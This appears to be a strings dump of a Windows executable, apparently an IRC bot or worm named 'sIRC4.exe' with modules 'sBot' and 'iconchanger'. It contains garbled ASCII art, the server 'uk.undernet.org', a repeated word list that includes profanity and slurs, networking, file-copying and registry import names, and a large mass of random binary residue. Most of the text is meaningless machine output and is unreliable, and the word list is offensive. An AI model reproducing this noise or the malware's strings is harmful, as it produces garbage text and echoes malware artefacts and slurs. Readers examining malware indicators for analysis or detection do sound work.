zz$?~LbKDPmfzhepUQZh*sGYu_PQKKgbg6=thDPUPWF=!i
VeeVoI7tt~";:::^!?iwo91?)?lyz3t~"^"tu$$[?=!"~LxZDVGAxxtupPe5i".:^=Gxebk4LheAAqbPPPFPZPZQk$)n&xC.^?eDDP)   ..,^"~(|{=;.=
3%!                "5ws{.    ..^^.  .      ..^!wUFhPFpGhFPYGDV^J+./&QPpUa/^gDQG"5DX+ .   ,i$!...   "dGZC5G0$!
kTC6yIIV6
2zUQFFQ1tqQ8qUFDZPShpptcFQq$PPA:,.^eDQKPpJ"\|IqGDFPFAPh|.. ;nkO4L3{aI$r[c$G*8mm[=LeUDSqZADSpPbYa9Y$VQFJ+!^;^+VqhVV*0OsyGFUUb&5ksvjl==!^:hFQa  .!FDK*..  .  . ... ..=
3v!                
6s6!       :^.   .     .;+TAQpDqF9chbDowDx,!]"$DUbFG!:;DQby:tUZt  . .;2t,..  . ^hAO3Yko~"2kzwo6o3aGuC&KK8YSu)yFpSOTbSQPhT0oG#KViFQg^ ..~seWQDbt,^tyCFAPQQpDq
<^"(}%=C!!5ouii(JT4mmLat$uexPPDAPppPQ4m&8shqDs4ay6=^<+ZAee*0utjl{i?!><"""".^<";SDPI . ;qWWx^ ...  ..  .   =
3%!               .!T43,  .    .^    .     ;=pSpQdZe+
cZDZlJDq,.")FdDpDv.:!PQUt.^}x+. . ./J!  ..   :kV
sa]!;)ayCIu*mCtry3UKP9kD6!ipQbn|vbAZDgdsxQK6!QDD(.  :"=9dQUS!.++7#dd*ADQPWe7^.^;,t^^o8mc(.^!=++]2tCCIz4QPbgQQFdphV8ObQQFFDpAGr="iap4xVori!^;,....:,. ."^.hSF[.  .y#KA
.  ..    .    =
2%!               .=V]^.        :        .^lmUgpgG5=,^GbAS"JgW^:iYeASgV;.;jAZs"..^~(   .;~_, .. .  .z3Iy^:..ukT7+2Y&o^^i8KK8$qp4\"eFPh~^"~9GZg5PDXs!mqP
.    .;|zmmj^!;+DPPs|rLPDWDn^...".,20wz
=....:::;JC
/"~(lu6Tx8SeUAeDPPFdUPphk
+"t7(FPQpxn[!;.      . ...ZD#i    >fSD[^..      ...  =
Jr!               .|;..           . .  .^wb*p0nJ!...-yqD*=.!gq"1edPz!....|ZQ
;. .  ^^...;.        . }4qz. .:Ym5!.^{0o3^jb43
PDS^."LFQK+.  ;:^_gKC7&taFF=.       ..^!",?S9qb(.."C&PPA6\.:..:i;!x8=... .  "$C;    .vOZDxzPP1=4Qx~:... . ^;:(FDAL5UQdk?;.. .     .nXP"  .   ;wh7^. . .       =
fJ!               ^=.               ...^jqx&a(!;.  .vgFSi^.^wd!kdgw\..  .thg!. . ..:;.  ..          )08z   ^&*T^ .!T6o!5h!!23FPU!..+QdX9;. :..;e&!_~=+hX+.      ...;,^^~u?2Xy;..^!tyDxI; . .!.^3dI". .  .:=2:.  ."qU#pi3QAC^^=mz^ .   .^.,\DFg47LpDPO+"..      .
A*; .   ..=qI".  .        =
JJ!              ."_. .              ,;=v{t~"...   ^Vbh0". :tauqgn!. .. ,tQ&^...    ..   .       . ."n*{ ..^G9J; :;wyuc6+,.!lDUAt^.!eFK8>. ...;h|...:"yX]^.       .^ ..~+;?gQ=.. .."J*q=. .."..<JOt. .   ."+.  .;6dQUt!4p)t"...)!.  ..;, .>gp#Z=t*DQFh1; .   . .re%,       ;0L!.  .        =
f2!              .,:             . ..,:,:..... .  .~PFm!.  .^vC)":..   .^3Q!... .  .            .   .+&t   >m9=.. ,7G
:. ,!PQP%t.;ieKgf".   ^),..  ."P0
.     ..;;.  ^^.;zWu^. . ..:^";. .:...^29;. ..  .".  ;CxeC";1x|^;".. :^.  .^"...^]aDW|,
+&PQD)..     .jz".    . ..!i|,           =
3r!                 ..           .   . .      .. ..IZP|.. .:"!".   .   .^9e;  ..    ..            . .^{~  .=Ti^.   ~a2z^ . ."SPh+%".^iXAg{.   ^;.     ,nx<.       . . ... .=#Z!.  .    ..  .  .  ^!^ .  .  .  .=F8=: .8t:. ;^..    .;^:.  "^igDl  .!nDAI^.. .   =_.  .   . . ;!;  ..       =
cc!              .                   .. ..       .^kI-...  ...".   .  .."+^.. .   .   . .       .   . ^^ ..(!:.   .,{aw!  . ^SKI,:"; .uPPG^.  .  . .. .!G>. .    .  ..  .  :$x)..   .    ..   . .. :. . . . ..!~^.   .".   ."".    ...  . ^.^1b
:  ..^"C
", .   ".      .  .. .:..         =
fr!                   .            ..  .. .     ../9<:   .   .. . . .   ""..      . .   ..       .   .;;. .(^..    .!y6~.  .;pK%...^../0qq^ .  .  .  . ^7!. .    .         ."o(.   .  . .  .  .. ..  .   .   ^",.     .  ...^!.. . .     . ..!oo.  .. ."+(;.    ;.  .    . .      .        =
c[!                                           . .^>"... .              .^.                           ..:  :!..     .:ow~    :hF=.  .  .~8p~.         . .<>.                  ^!.  .                          ...            .^.              ,!r,      .:^^,  ..                           =
r3! .                                            ^^...                  . ..                       .  . . ,;     ....{9~.  ..&V^       :|$7,.       .   ,;...  .             .;...                                           .                .). .      ...  .                            =
13!                                                                       .                        .  .  ...         ^=~..  .}!.       . ,i^             ..                   .  . .                                       .                 . ; . ..  .   .                               =
                .......             ...    . .. .  .  .                         ...                 . ...       .  ^/.    |;. .. ..  . "^        .  .    .                                                ...              .               .;            .                             .=
crt??()iii++++it++ttt+iiititi+itt+++|?()(|?|)(?(?()??(|)((?|)||)))(|?()?)()()?)?()|))|?)?|)|)|||||)(?|?=?====()?======)l====|})============+==================================================================================================||=)=========================================i
ZYYd
sIRC4.exe
C:\marijuana.txt
uk.undernet.org
Runtime error     at 00000000
Error
0123456789ABCDEF
AK47
ALFA
ASIA
ASS 
ASM 
AMY 
ANTI
AV  
ANNA
ANNY
BABE
BAD 
BASS
BALL
BETA
BOMB
BOOM
BO3 
BOY 
BOYS
BIOS
B_B 
BUS 
BILL
BLOW
CUM 
COCK
COOL
COMP
CARA
CMDR
COP 
CALL
DARK
DISK
DROP
DANA
DCC 
DEAD
DUKE
DUDE
DEAF
DUNE
DOOM
DRUG
DOPE
DODO
DEEP
DOS 
DUKE
DR  
DOC 
DOIT
DICK
DINO
DORK
EVIL
EVE 
EMMA
FUCK
FUN 
FOOL
FIND
FAG 
FREE
FOX 
F0RK
GAY 
GOOD
GUN 
GIRL
GWAR
GAME
HACK
HUG 
HARD
HUGE
HELP
HOLE
HELL
HOOK
HULK
IRC 
IBM 
ICQ 
JUNK
JOHN
JERK
JOIN
KATY
KILL
KORN
KIDS
KEWL
KID 
LARA
LISA
LIST
LOVE
LILA
LUCK
LICK
LESB
LEET
MARC
MAIL
MASS
MEGA
MIRC
MMX 
NWO 
NET 
NUKE
NUDE
NTBS
MS  
ME  
ORGY
PUKE
PIRC
PASS
POLY
PROT
PORN
PRON
PUSS
PING
PONG
PRO 
PERL
P200
PIC 
PENT
PICS
PK  
PREZ
POP 
QUIT
Q3  
ROB 
RAIN
RIPP
REAL
SUPA
SNOW
SHOT
SYS 
SEX 
STOP
SINK
SUX 
SHAG
SUCK
SOUL
SCAN
SHIT
SPAM
SUZI
SOFT
SCAN
SLAM
SKL 
SLAP
SICK
TITS
TINY
TINA
TWIN
TOTO
TR3 
TROJ
TEAM
UZI 
UNIX
UPD8
UPGR
UGLY
USA 
USE 
U_ME
VSUM
VIRC
VX  
WIN 
WNG8
W95 
WARE
W98 
WEED
WORD
WRIT
WNT 
XDCC
XYZ 
XMAN
XENA
XIRC
XXX 
YORK
YOGO
ZERO
ZOOL
ZOO 
ZORK
ZULU
AD  
AU  
A86 
A66 
A11 
TEST
YOU 
NOW 
AK47
ALFA
ASIA
ASS 
ASM 
AMY 
ANTI
AV  
ANNA
ANNY
BABE
BAD 
BASS
BALL
BETA
BOMB
BOOM
BO3 
BOY 
BOYS
BIOS
B_B 
BUS 
BILL
BLOW
CUM 
COCK
COOL
COMP
CARA
CMDR
COP 
CALL
DARK
DISK
DROP
DANA
DCC 
DEAD
DUKE
DUDE
DEAF
DUNE
DOOM
DRUG
DOPE
DODO
DEEP
DOS 
DUKE
DR  
DOC 
DOIT
DICK
DINO
DORK
EVIL
EVE 
EMMA
FUCK
FUN 
FOOL
FIND
FAG 
FREE
FOX 
F0RK
GAY 
GOOD
GUN 
GIRL
GWAR
GAME
HACK
HUG 
HARD
HUGE
HELP
HOLE
HELL
HOOK
HULK
IRC 
IBM 
ICQ 
JUNK
JOHN
JERK
JOIN
KATY
KILL
KORN
KIDS
KEWL
KID 
LARA
LISA
LIST
LOVE
LILA
LUCK
LICK
LESB
LEET
MARC
MAIL
MASS
MEGA
MIRC
MMX 
NWO 
NET 
NUKE
NUDE
NTBS
MS  
ME  
ORGY
PUKE
PIRC
PASS
POLY
PROT
PORN
PRON
PUSS
PING
PONG
PRO 
PERL
P200
PIC 
PENT
PICS
PK  
PREZ
POP 
QUIT
Q3  
ROB 
RAIN
RIPP
REAL
SUPA
SNOW
SHOT
SYS 
SEX 
STOP
SINK
SUX 
SHAG
SUCK
SOUL
SCAN
SHIT
SPAM
SUZI
SOFT
SCAN
SLAM
SKL 
SLAP
SICK
TITS
TINY
TINA
TWIN
TOTO
TR3 
TROJ
TEAM
UZI 
UNIX
UPD8
UPGR
UGLY
USA 
USE 
U_ME
VSUM
VIRC
VX  
WIN 
WNG8
W95 
WARE
W98 
WEED
WORD
WRIT
WNT 
XDCC
XYZ 
XMAN
XENA
XIRC
XXX 
YORK
YOGO
ZERO
ZOOL
ZOO 
ZORK
ZULU
AD  
AU  
A86 
A66 
A11 
ZIP 
ARJ 
RAR 
JPG 
ARC 
SWAT
SEAL
RAW 
T2IR
INCA
RATM
JAG 
HARM
SARA
WILL
GP3 
ROD 
RAPE
PETE
AL  
KARL
MEN 
GUYS
MP3 
WAVE
SECR
DON 
MPEG
XL  
BUTT
FAT 
NO! 
ROCK
EXEC
H8R 
BEER
RA3 
QUAK
ZORO
BLUE
NINE
ROBO
COP 
R2D2
POOP
COOS
kernel32.dll
DeleteCriticalSection
LeaveCriticalSection
EnterCriticalSection
InitializeCriticalSection
VirtualFree
VirtualAlloc
LocalFree
LocalAlloc
GetCurrentThreadId
GetStartupInfoA
GetModuleFileNameA
GetLastError
GetCommandLineA
FreeLibrary
ExitProcess
CreateThread
WriteFile
UnhandledExceptionFilter
SetFilePointer
SetEndOfFile
RtlUnwind
ReadFile
RaiseException
GetStdHandle
GetFileSize
GetSystemTime
GetFileType
CreateFileA
CloseHandle
user32.dll
GetKeyboardType
MessageBoxA
CharNextA
advapi32.dll
RegQueryValueExA
RegOpenKeyExA
RegCloseKey
oleaut32.dll
SysFreeString
kernel32.dll
TlsSetValue
TlsGetValue
LocalAlloc
GetModuleHandleA
advapi32.dll
RegQueryValueExA
RegOpenKeyExA
RegCloseKey
kernel32.dll
WritePrivateProfileStringA
WinExec
UpdateResourceA
Sleep
SetFilePointer
ReadFile
GetSystemDirectoryA
GetLastError
GetFileAttributesA
FindNextFileA
FindFirstFileA
FindClose
FileTimeToLocalFileTime
FileTimeToDosDateTime
ExitProcess
EndUpdateResourceA
DeleteFileA
CreateThread
CreateMutexA
CreateFileA
CreateDirectoryA
CopyFileA
CloseHandle
BeginUpdateResourceA
user32.dll
SetTimer
GetMessageA
DispatchMessageA
CharUpperBuffA
wsock32.dll
WSACleanup
WSAStartup
gethostbyname
socket
send
select
recv
ntohs
listen
inet_ntoa
inet_addr
htons
htonl
getsockname
connect
closesocket
bind
accept
0,080<0@0D0H0L0P0T0b0j0r0z0
1"1*121^1f1n1v1~1
10272
8/8:8E8M8W8a8k8
9 9&93999S9Z9d9n9x9
:2:J:R:
;5;_<l<
=#=|=
=	>'>,>2>
?!?G?S?[?
0#0,03080>0Q0Z0x0~0
1*1J1b1
2$2,2
3!3+31393?3E3L3V3
3%4C4O4W4
5+5D5]5n5
8/9X9_9f96:K:~:
:0;7;f;
=$=5=>=T?[?l?x?
U1]1f1
313G3^3s3
6.6:6N6X6k6
7A7H7j7
7'9O9V9n9
:c:v:
;4;?;\;f;
<#<E<Y<
=\=k=
1U5^5i5n5v5
5&6-6?6]6f6r6y6
7"7)7-7G7P7Y7j7t7~7
8,8=8N8Z8_8d8k8r8|8
9&9.969>9f9n9v9~9
:#:/:<:N:
<"<*<2<:<B<J<R<Z<b<j<r<z<
=$=.=8=B=M=_=r=
=5>}>
0l0{0
1$191X1q1
212I2
4A5s5{5
6'666E6T6c6r6
7z8C9V9g9w9
:Z:M;
;0<Q<
=)=7=W=g=
= >s>
3M3U3`3|3
5)686\6
677]7
8 9>9i9
<2<D<
=-=p=
=3>?>L>^>d>p>
? ?-?5?<?U?Z?d?s?
182R2k2
5I5V5v5
636Z6o6
7R7o7
8-8M8e8o8v8}8
9+9J9y9
92;:;];
> >+>6>A>L>W>b>|>
?%?0?J?U?`?k?v?
2,212@2N2
8 8$8(8,8084888<8@8D8H8L8P8T8X8\8`8h8s8}8
,00040
wwwww
wwww
3333333333338
ww;?
;ww;
vvvv
;;;;
;;;;
;;;;
vvvp
;;;;0
;;;;0
&=O8
sIRC3
WinSock
System
SysInit
KWindows
UTypes
3Messages
sFunc
iconchanger
sDeclares
sBot
PAPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDN
@P%/B?
%WgP
}"E/
w7[c
L01 X
M[nH
$z7K
KP~a
0iIX
60C,
Do)q|
S0p55
zs>?
A]8ot
Q\#A9
="Ic
\1~c
Du{"
CQ^X
f.)q
%}8O7F
KQ%7md
Sz|JF
m7',
i%	^
z5 h
'g,4Qd
U:JD
"RWz
NLr}
a%+*\
t8n0OS
d(jZ]
V6!c
OrA)
6_.)3
sQ2VJ
g:xG
keP 
Q$fm
j"<b
?G~C
^$e=
y\>	#@
*D1b
yW>j
HZB%
sKqZ
P!t9S
+"Zc
J4Zd;
E~%<*
^MhW
^9kP]
0:(q&
l0]t
sY+F
,!@0
>t!Kc}
1QUxr
?3 W
7Apn
.D(*
pW>W:
bU@i
W\R:j>n
b@9M
!EC8
qHW)
r^*z
%">C
3#7C[s
e:<i
ACab
9,?#
sUE++
s!yI
0ZV?
$w0)GaA
2Kq::*V7
f	}Y;
XLY]^
_h;z
/?DQ
VgU=xX
is>n:
v?81)
O~*tH
*GK*
9mihTY\
cmIa/T
ppyY
Tos\6
9w~C
1{@"m
g)KH
B9Ez
[ymd
wELM
	YP'
IsDv
raRa
Xf}{
s;&9
%$zZ
v612
cR\4
 er!k
J9H<B{
pk`<
}/	E 
Fy.y
D#~g
P M2I
q7"TG!
eTnM
	wA>
.D14"0CU1e
Utjt
j.6B#9v
tu_'
wV,GR
r3iu
aUf.I
yyRv
"i]"z
5|4l
)Qhfz\+l
1iu5
6[ YR
;xck
qnpd
U>tJX
?]}t2
JV4r
i<4`Y
zQd^
,2s:
qWyw
"SZc
XRp)
(2e.
A2C'+`
e&~L
*6G&N
jGBuFB
!_2d
:?<_
+=bM(=
rC@s
H^\!
5z)%
 aBk
njqQ
q&].
wPj<
[:o}
2R,Gt
S.,&
bF[\v
Uay8
3UnM
7:aw
R;y1
ce*J
S}	`
afPKX
B)e`
0:A<
/zi~
)Fdz
/Y(p
ZInO8"
.GTr
>E,0
c%8.
?6IF
[3u"}
JL{\
mmo*
VJvz
7WEQ``
fQ90
+#8o
(8`@
V4Ec!
fp4(
N|hW
m:389Zk
"@+3
X=P!
AXMVx
?^Wz
;A_R
LP4T`SW
&/@-_
#XD 
PN&|V
NKXD
.A9jN
MK:k}
Tp@ MC
7D,9
3]Q?
XEzq
hWbf~D
g?s{o
'r2D
D?_Y
H<lH
b"B	dF
@)t}
\+<V
d-D,
BGAMH
`KBv
%pYqb
ie(K
8In6"
meWHC$
%"xE
	of*
>qJ	
Jm&f{tA
$b<X
jn{%fd
L.QO\
|XIr
)j7#
(Ma	h
dmiO
^bjpvZ
@q	a
/2V\
2.kx
.m-"H
|9Mv
#v>[
%d[<Vv
x;$I
t+Wc
$e$.
^oE#
H4dh
phD@m<@
U2rO
PgRg<[
hwea1
yXyj
g-ki
	OMd
k7<C5
sTN%
w1rI
9I!7
^CcSf
'#Tq
opg6
E:4)
	"*hu8-
ZE(y
/jeJ
@#?j
[sG]
`k,,
5`+*
S~	!
0r?;
-0p!
[<	R
FLB?
M,q@|~
4Bzg
3m`q
cq|1
}Q*j&
U|WY
H">xHy
+7Cr
j	{\
RpRu0
KL}>1
NPu2
DAM1
!Q+ls
kO]4
kNK8
G8th
0er0b@
0|H"
_<pW
OVj>U
nGi*
QrQ}&
m_"db
c|,L
9A|	
^aAf
"*><wY
0t~d
-CUxE
m#4<
PaHO_
ci5V
r2GJ
m^NrxrC:
z66r
%~en6
#]	{g
|bdju
Mli>
E_dYk
{V X
XfrP
v_*!
	??6
|sE.
tMd]9
&e|-
!R;WD
NVkr
-eE.P
TMi@
'f?Hr
%9ANp
ahd8]t
MOkg
p0E&
3z{N
+-?z
qF,L
fN,lf!V')
;=,3
xl{.
0BLS/
{iY8]
LFQp
w!/Q6	
ssis&R
k,_o
(1dB
x290
qvni	
gtUVM
xv~^
}`nr
QKee4
h)m!
[NT<G
)7t}
DtkPB
6z3	
w;J_L
r/W]
hu%6)
[F|x
8/:.Z
NlO(
;B*(yaNy
yxa7
>8p|i
1QLc
N&iCd
r [d
owOx 
OQx9
.j}t
^ih:
g ^*>
cS$e$
5scGFuA
?WE%
7rHfK
5Qr9
DWi;7
?XW	
){tn
5sHe
6:`@
[UyP
@R.>
1\@[
)^nZsih(
rO;c
[bF&t
F3sK+
TW+M
NQc_y'y
F$m,@
_;\SY
u&Z$
e?.(A
Qt_Za
\)WL
D$Y0
oh"S
h9L]
VXz-
@&X8
	xd}x(
/(B!Ni!d
w;f 
?Tz\
K~wD
a1svC
!#J{o
F^![M
z"DX
63Ck
dt? 
8/!M
EGJU
x0b0
GM;=
0fMv
+:QSI
;=G_
(Vk?
la^t
Euey
>dn^
jC26
6Ajk`W
jupeQ@A_@
pVHw
|g3o
+SU[
CI-pC?N
8R%.
PFB+
f\<}%
Lc;4])
R@G[
B	R2Y"
puN!@
S+kY
IVYMO
_W'.
}pGS8
R6BO*G
#k%JR
A~)H
TEzp
m_}8Qm
:G&F
65"W
 {!K
-;".
KQHmv
\]q1
#3Va
S{i*w
_}< s
pnvb
x9.H`
udFs
2Pg$
9|WL
1'^{a
whP}
EEvo77
V3xMI
kfQB^
NNb(%
./X/
nqf@
:.-;
KK`W
XVqO
M~ XD
4{j 
-"C{
o{>mL
+ay5
m/Q5
(X?(
mBM{
Ms%&O$
81hY
4m_S
F`]Pp
L9J\6
m'~G
fsg`
~]HK
.69(
go(Q
2H4@
;v8f
sH-O
@R",
2	v!m
B3x-
$]5Y
,W)}
_jVV
_Vl3,7
mxXd
0qh)
=**o
I8tZY.z{
&ZPHV
aXuq
\+#V
|,`Z/
ID&-
fc9zs
+ },F
H|OZ
5{2[
"ues
S7[)>#Qm`
"TfR
	+Tg
zX.l
sC=oZ
k	|~
GrFll
'd'S`
yFg3
9D^[#
t1}/K
TcO+
v0PB
%xqu|
,lf{
5nYQ
XSxr
#"o2@E
M03y0
?%Ap?
l(RR4E
<q4U=
=DzW
xO"LH
n._Xs@
:p,cl
F6KM
r?sx
oO6zK
8$e!
`E0Q>
Dl_U
76.	y
k	Pv
/;Qm+
KkS\
b8eH#I
b]?Y
;y(R
Vk'7
p{&A
Mg4/
"IU`1
fGSX
I!#X
9X[}
1nE@
o=!-
l!Am
v!f,
_?!]
L{5O
AWX&
#t0l
#6 e
U |*b
_GAh	c
>R&mO
WNv}nZ-r
	`'dP
[&1U)
 +uM
Rn:$	I
3C:B
KSeA
0WJ6
Zc<YF
gW:z
O:U,
^.Y_
=L0m~[
JVeJQ
dWly@Xk
`LYm
CQ]6
jVJy
2h$/e
{2O_
95|D<:
aK;V
C1~+/
?R.y
RYI(iV*j
iJa9
G^t~
7(d-
,37G
~eIv']^
kv<l'/<:U3
9a5&A
(kZET
3AR_
O&u8
8g&L
QJwu
o:n^
 BTx
w{<}
)16o
5z1)
TH?j&4"2
_) "
[-712
*l	u
gV	Z`
n'?}
NH0V
IM*9D
l@:$
xcYF%S0^kI)
Y(h2p
=tl$
F4,F
)Y[r,T
d~^Y1
' j"$Y|
-NP0
(~AT
jB"0
	WO2
R]&`
*R$	
$?`\
l430
IDQA
Q2#:
z>3l
H|/7
<,"q
fVWk
#5K?
^{u!
+S{<
L)PhdE
IfD0
k#kktf
5A08!!
#xIe
3V&T
p?PN
Fr~+
{% x
De(_
89f$
N~n#K
2\f=
^@nv
(\Id
!}_:
4Dv<J
>>oS
4@I:
RSaq
"a]+8	xa
@net
z(UdiA
$rr"h<
Q^u0
})lz
<r+c
RbntF
zW=6
rir-B3
cwh	
U|{^
/s#>eto
E{T-
	?RD
Q+V@
u9qi
(PKk.R
wkvd
Av;1
IS);
^r,B
<q q
=5 L
^2>+Dg
n4(h
>i*ood
M _+
KZ1b.
`pGj
/'8/!D
E%qi4
o/iI?
	@X 
@s#p
01O.d
(Ad/
!r9<
a\z)
b^yn
5Dh)
!<^?
3/AO%rM
fq|]@!
Y;S{fj
b</4
+!] 
mZzB
]\7G;
""%6
h{i 
V(j7,
y4k.
Ky2Ep
_(&R
QU'PQ
-h5P
cNhg
mowA=X
fx/Ggo
vIZJ T
w:K+
P*Zf
pPhbs(
0p-y
;bR=
*Oym4
!#"t
l0Ict?
'J3'
6_{]
Ix	Nzr
%PM $
k	n.
x#l#S
+NKQGJ
nJRz
8p@3
v\<h6
S&h`
kQ+4
f*_s
bo&p
n:o'1
IW2FQZ
yy8W
P.)Y
O_id%
o6H'O<
nexCS)
&"5gZ<
E0z5
3WDzn
Qy'2
IVT2
"d_n
23jk
G"Ytz
`BsDM"\
8_]V
R61T
JLIe)3Xy
PM/u}
eBh~
?W69
F	wx
fTg@
GlFI
u).h
bYPc
7kA,
XL:KE
%Ye'
Ra9cU
=z5}
ui]g1
&]-E
G(43
hcYB}bZ
o[WNG
~K5 
r:Cv
KlW)
s]!0Q2
(n`n
+D(V
h{c\
QZ~;1?
P`=e9
i3)d
}j{E=
Ix0x
Hn:Z
bTuu'
G_"W
7a Y
yh^Xr{\%
lc~UU
]il(
[ztl
/)%1
^<mp
sluD
J@8[
A.o^V
Y"v7
&^-0J
Ma~oHe
g~?	n
cs5M
ynM=
jnQg
^>P!
\i"6
vJJ6
1%0u
H@M-
-Gla
])k	
;*>`
z62W
!O<qW
@,]7(q
 VJw!x
x>^6U
dK^'{
lqk(mGM
)TY\e
6*:L
A!Ci
tDdY
	Bp}
KDRz
FhPBr
m5L-t
oi/`
5HYq
~eI)U
;+qe
,5yn
olB.
q+fx
wem. 3$
jBpy
mkQ+
;)"y
=z}~
>@lz
nfaQ
4Ej2
vw#%
TFi<
>%yUIB>
~@JKI
I%@&d
:v.Z
2l4j
1bzt}
[)+|L
EB\tx
I@|o1%
tfQlX
C %UI
$HJV*
NU'~L
AgW]
nrc+
q=['O
&bq]
-mAZ\
?kP5N
&R|u
8V?db
}NzNS&
A7%E
P5v;
'&X)
z"xRY
99[>I
bI!X
O-W<
Rk%I(
u.mf
@SyC
V.o0
vueI
GzZ4
{F On4
N0(G
{Q ]
!9>eZ
{4ol
^J.JSx'
ULlJ
$jQW
J5+LC[
*d[Z
_yQ+|>X
H>`. q&Q!
}Ib9
f/3X
W':e
DlfE
lCq=
y8EHNJ
6do4
$^,xT
um#f[
4rxe.
>61M
;RR[
I$e6
si|<
nj}X
0&?Rdbd
7&]!
4Tkj
k	i`#
xgEA
U{xV):'XOx
A<[Kr
MfW%U
u]*	
\W-g
xSC0
|$YI]\s
YBvp
-bg6\9
.<d;
?i<|6
uXjV
fQ=Gx
f(25
8Jl7_
>.cH
J[BFY
9I?Q
AeEI
/]=5
',Di
@.J-
!_u!
_)o?
Imx].
 R{P
T.yG
OY0fB
\z>W
jjld
&\iiaq
)[V(
P[lI
1|*9
!>Wn
FJ\a)
F>}'
HlD6
zNGy
PcSu
14Ko
p]F4
r^1,
Y2D+
KO[&
g9oWf
I #]
F_}cG]g
Ux6 a
d<Rx
<8 j
or00BRd
%7Ox
VWx`
ZF	,2
m{n0
fP	J
Sp2x
FPc4
Oz7H
=_q0+
?qx(
gOu3
b$7^
EYG:
7e1jP
gMM#.
x(qm6
	EZ$
K$ <
Eu\t
xK4C
:GIn?P
6#c	
b*GDoc
`w-F
Lj-g
	IHs
!(0:Q
Ii'$
trGE
@g^+
(mKy
Q[#;o}
Ck$leD
p'X)
<qFT
wGb1
$:oU
&(dO
V	&i
loLg]
tO ?,
93f`y
7fUO
wz&PX
nzHhb
	3-c
5Lo:
c0#I5B9
:&3KC
2"ooZ
:JbPJ3G`
2C{_
yy%Y'@
[k.a
M%Z[
Sw61
qAHw
=qNL
4Wo/
[AtJ
?MF?
g#v4
,],A
B>Jr
YW-?j
;;ef
 Z/r
ymjX;
"D)<6
(A;p
6;u1
cqP/
@:U0
G1+P(,'
j :-
%A2:
v[W?--W
faB&K
*fge
AD,v
9C~%.O;
@M L
SEN6
:/.r
{p\X
 n ^;
Q3SlHrf
[yQi8
'(w/
9cwxS
mCeq_
r1_d
%5"b
|B!{5
KBE8qY
=Kr0
)Xl!-
_,T\a\
#RxW
sb<?
-{<^
4A1Z
U,{dp
i)syF
I;)Y4
sy(Z
YYx 
6o"^
#O:	R
YyM&^
,85:
PEHA
X53z
qWsh
F174
&y-8`o|+
}(!D
5]`2Bfe
q_Hx
"#`\
aEAd0
@p*?
&dor
3K6m3=5
tdiL3
0^#z
19/k)
#5m)
:StU
ZU[=
]6;6
lX'y
}Fon
Q%&}
x-QX
*8(C
iL<)
S|m/H
Y9c{	
k9Sk
Xs{@K
jQRN5
CK\6'?5
w6|+68
xpw`
SEKH:
@|&S8
dxBes0
MxE<
%fF~
LOw]
GDjum
0zgPc
##N_
{P*W
+mr&
8Px	
J[At'
!txUu
M$vE
sngj
G8lL\
rqLb
V9| ]R
XB^O
dY~S
U9PG
o/DZ5k
38;x
TIc8
Peug
g;+E%
*2j3
	tN8
+A08
F)4A
fDXX7
DIG=
RwGV6Lv4
'G$3
H7[[Z
L~qn
ME"X
1$Aa
+<(8
8;-W
qwAc
7P<w
Rs 	6
qO]3
tE-I
ZVVH
q7mi'
*/V?
n)l~
|vCJ
ci8M
X`Ku
M-YU
cI/{
NgC\
;	2>
"KaH
fk{D
NJlJ
XTt6
e  g
Cxy`
HF"/.
*,{s>i
wZKL
?-k*
dVN*
LGyC
*RLj
Xj>'
MZN#
c.6)
rdd2{5 >
NA}T
iS> 
3[a%r
$x%`[b
4^zn
l8qo
25SYf~
P&g<
s+nzx
	$j#Z0
tb5Wn
)RlU
t%Ly
	TQ0
1*S2
Y^m	:'
Y\;;
-/Y}
>[y:
N(ccom
78h>$
Lu.`<
m<'%d
}5[n
)&Jn$
8IGA
,	9/3
UCNa
}~2C$4
W)T\
|.Gi
_G/e
X%gO
9i5u
9djek
W|V$X	
g-'J
N:?e
UyKN
!sM}
>MVk4,f)a E
us[J
_+h;
?1hP
qh\:
?}M[T
;}T`F
r\@x
p5`F
7?l6
h2\S
	SX-RC
5pq\	^&
Zhr1
(]{5
\@3o
9rD4#
.4^<
<\W~
^hGaj
c>4~
l1'O
W4j*C
$q0a5
NoAI
3!QP
'vZw
+r;b
rZ}!
KX: m
iO%X9
ED1)>w
gxoi
~I~<
eHcv
8!1v
:}j3V
0/af
Or~/
Yy(0
p95a
1YEV
KXB]
L<(I
"rhT
%|Xj
ICcu
$qA%
@HaOI|y
x6/	
9QOO
;;@7cR
ZOg7I	
^vjm
S'Bp
F>RX
	779
<m=<
%LK}
T~,F
t<2R)hm
4jVS>
U+C4q
_kwh1
"NGsk
8^D#
%Ue1	
m1a$
<R#*
rXz)t	x
;MbY
RQsR
D=	2
b~pQ
?#F~
%81)4#
'/O%%A
wDxY
(.ukj
,mmd
prTJT
zURB
X{d.&
v7j7
 L?SZc
9onb)
=hwy
R:Mo`
}dIc
BWT]S
"6Le
5d'M
-/z<)
#Y?/1
$u;*
pdeUD
(A^nGe
OaqB
&-A(
)Gv(X6hK3
=OhF
aE_j
y?{+R
~"ETr,
WZ|'*
gU	#
:6wFT
XZ}%
U'pB
\HUZ0
 QAJ
Q413
~O]u
B|5p
 Zne5k
.9`F*
Km6,
38L P<
[!6"
heK 
:fj0
.6$N
Za!m
ALRa6
TB72
$4M"
oFwF+
S/0]
@uo\
G	gqt
u|W;0
.C8L
6(6}
]7C<
bc6F
^},]
Lu"i
IZO2+
}g`B
-iBBk
&Y0-
/IOK
Hk>l
=R!g
V"XU
d-]D
_R<P
;f+O3Vd
{g&<3
c1-v
rkk.
v $^p"1
Eh!I
l3w:
CI8A
HBFh
2vc4YO
79)Q
	E7B
&'QOp
}Rp~
-x:Y#T
"*t\
9F)6r)
D!D}j
z[Yz
qcUr
N|RDH
6&#f
39[Qt
dHE4W
	[b)
~oE$
=\;w
3;Ds
c%|	
b>eYy
)j$1>N
@KeZ
Rk(O
(+X,d
|X`%
vTm!$
g2i"s
:R0k
wVuc
tWS5
qE L
P/zn
Hv<6
I?fHI
a8(-
@d{_
t2-`
KAL[a
vHvV
v@;rL
A)@p
07oG
V]y7
S=d1=
ApA<
^:|_
u0y}u
9,tm
yyjTY
I:cW
W/As
R^>/
OKsq
<X!d
%.4G$
tI\> ?
g-y}<
]9E",0s
3Q8#
_r|`/
JB2W
(oA?
ic\m
Uz*A%J
#I+`	
.P12X
wFbu
TZJQ
{.xk8z
GQ.t
;JUoT
sP2R
xlz%
{.2a
juZ`O
OizuA
